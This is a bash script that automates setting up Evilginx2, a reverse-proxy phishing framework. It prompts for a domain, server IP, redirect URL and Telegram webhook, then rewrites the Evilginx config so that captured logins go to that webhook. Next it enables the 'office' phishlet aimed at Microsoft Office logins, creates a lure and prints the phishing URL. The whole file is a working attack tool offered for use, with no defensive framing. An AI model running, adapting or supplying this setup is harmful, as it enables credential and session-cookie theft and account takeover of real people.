#!/usr/bin/env bash

LOG_FILE="/var/log/evilginx_auto.log"
CONFIG_FILE="/root/.evilginx/config.yaml"

# Function to log messages
log_message() {
    echo "[$(date)] $1" | tee -a "$LOG_FILE"
}

# Ensure `expect` and `tmux` are installed
log_message "[+] Checking if required packages are installed..."
if ! command -v expect &> /dev/null; then
    log_message "[!] 'expect' not found. Installing..."
    sudo apt update && sudo apt install expect -y || { log_message "[!] Failed to install 'expect'!"; exit 1; }
else
    log_message "[+] 'expect' is already installed."
fi

if ! command -v tmux &> /dev/null; then
    log_message "[!] 'tmux' not found. Installing..."
    sudo apt update && sudo apt install tmux -y || { log_message "[!] Failed to install 'tmux'!"; exit 1; }
else
    log_message "[+] 'tmux' is already installed."
fi

# **Start tmux session and re-run this script inside it if not already in tmux**
if [[ -z "$TMUX" ]]; then
    log_message "[+] Starting tmux session..."
    exec tmux new-session -s evilginx "$0"
fi

# **Inside tmux session now - Proceed with script**
log_message "[+] Running inside tmux session: evilginx"

# Get user input
read -p "Enter domain: " DOMAIN
read -p "Enter external IPv4: " EXTERNAL_IPV4
read -p "Enter redirect URL: " REDIRECT_URL
read -p "Enter Telegram Webhook: " TELEGRAM_WEBHOOK

# First Evilginx Run - Start and Exit Immediately
log_message "[+] Starting Evilginx for the first time and exiting..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "exit\r"
    expect eof
EOF

# Ensure Evilginx fully exits before modifying config
sleep 5  

# Modify the Evilginx config file
if [ -f "$CONFIG_FILE" ]; then
    log_message "[+] Modifying Evilginx config.yaml..."
    
    # Fix dns_port issue
    sed -i 's/dns_port: [0-9]\+/dns_port: 5300/' "$CONFIG_FILE"
    
    # Modify other required settings
    sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
    sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"
    sed -i '/unauth_url:/d' "$CONFIG_FILE"

    # Ensure webhook_telegram is correctly formatted
    if grep -q "webhook_telegram:" "$CONFIG_FILE"; then
        sed -i "s|webhook_telegram: .*|webhook_telegram: \"$TELEGRAM_WEBHOOK\"|" "$CONFIG_FILE"
    else
        sed -i "/general:/a \ \ webhook_telegram: \"$TELEGRAM_WEBHOOK\"" "$CONFIG_FILE"
    fi

    log_message "[+] Config file modified successfully!"
else
    log_message "[!] Config file not found! Skipping modification."
    exit 1
fi

# Validate YAML syntax before restarting Evilginx
yaml_check=$(python3 -c "import yaml; yaml.safe_load(open('$CONFIG_FILE'))" 2>&1)
if [ $? -ne 0 ]; then
    log_message "[!] YAML Validation Error: $yaml_check"
    exit 1
fi

# Second Evilginx Run - Execute Commands
log_message "[+] Restarting Evilginx and executing commands..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "phishlets hostname office $DOMAIN\r"
    expect "evilginx2 >"
    send "phishlets enable office\r"
    expect "evilginx2 >"
    send "lures create office\r"
    expect "evilginx2 >"
    send "lures edit 0 redirect_url $REDIRECT_URL\r"
    expect "evilginx2 >"
    send "lures get-url 0\r"
    expect "evilginx2 >"
    send "config\r"
    expect eof
EOF

log_message "[+] Evilginx setup completed successfully inside tmux!"
